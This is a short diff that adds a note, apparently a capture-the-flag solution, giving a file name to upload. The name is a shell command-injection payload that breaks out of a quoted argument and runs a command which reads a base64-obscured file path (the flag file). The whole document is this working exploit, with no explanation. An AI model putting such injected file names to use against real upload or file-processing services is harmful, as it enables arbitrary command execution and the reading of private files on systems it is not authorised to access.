@@ -1,0 +1,3 @@
+Upload file with name:
+
+a" ; echo "flag: $(cat $(echo L2ZsYWcudHh0 | base64 -d)) .jpg
